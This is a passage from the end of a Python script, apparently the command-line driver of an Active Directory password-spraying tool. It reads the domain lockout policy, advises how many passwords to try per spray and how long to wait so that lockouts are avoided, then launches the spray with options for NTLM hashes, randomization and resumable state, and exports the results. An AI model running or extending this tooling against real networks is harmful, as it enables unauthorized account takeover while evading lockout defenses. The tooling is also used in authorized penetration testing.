                # Display maxPwdAge with special handling for "never expires" case
                max_pwd_age = policy['maxPwdAge']
                if max_pwd_age == 0 or max_pwd_age > 36500:  # >100 years = never expires
                    print(f"Maximum Password Age:     Never expires")
                else:
                    print(f"Maximum Password Age:     {max_pwd_age} days")

                # Decode password properties flags
                pwd_props = policy['pwdProperties']
                print(f"\nPassword Complexity:")
                print(f"  Complexity Requirements: {'Enabled' if pwd_props & 0x1 else 'Disabled'}")
                print(f"  Reversible Encryption:   {'Enabled' if pwd_props & 0x10 else 'Disabled'}")
                print(f"  No Anonymous Change:     {'Enabled' if pwd_props & 0x20 else 'Disabled'}")
                print("="*60)

                # Provide recommendations
                if policy['lockoutThreshold'] > 0:
                    safe_attempts = max(1, policy['lockoutThreshold'] - 1)
                    print(f"\nRecommendation: Use maximum {safe_attempts} password(s) per spray")
                    print(f"Wait time between sprays: {policy['lockOutObservationWindow']} minutes")
                else:
                    print("\n[!] No lockout threshold configured (unlimited attempts)")
                print()

                # Only exit if no spray operation is planned
                if not ((args.userlist or args.username) and (args.passlist or args.password)) and not args.enum_users:
                    sys.exit(0)
            else:
                print("[-] Could not retrieve lockout policy")
                # Only exit if this was the only operation requested
                if not ((args.userlist or args.username) and (args.passlist or args.password)) and not args.enum_users:
                    sys.exit(1)

        # Only execute spray if we have both users and passwords
        if users and passwords:
            # Execute spray
            results = sprayer.spray(users, passwords, auth_user=args.auth_user,
                                   auth_pass=args.auth_pass, is_hash=args.ntlm,
                                   stop_on_success=args.stop_on_success,
                                   randomize=args.randomize,
                                   shuffle_passwords=args.shuffle_passwords,
                                   exclude_patterns=exclude_patterns if exclude_patterns else None,
                                   save_state_file=args.save_state,
                                   start_password_idx=start_password_idx)

            # Print summary
            sprayer.print_summary()

            # Export if requested
            if args.output:
                sprayer.export_results(args.output, args.format)

            # Exit code based on success
            sys.exit(0 if sprayer.get_successful_results() else 1)
        elif (args.userlist or args.username) and (args.passlist or args.password):
            # User wanted to spray but no users/passwords were loaded
            print("[-] No users or passwords available for spraying")
            sys.exit(1)
        else:
            # Only enum/policy check was requested, exit successfully
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n[!] Spray interrupted by user")
        sprayer.print_summary()
        sys.exit(130)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
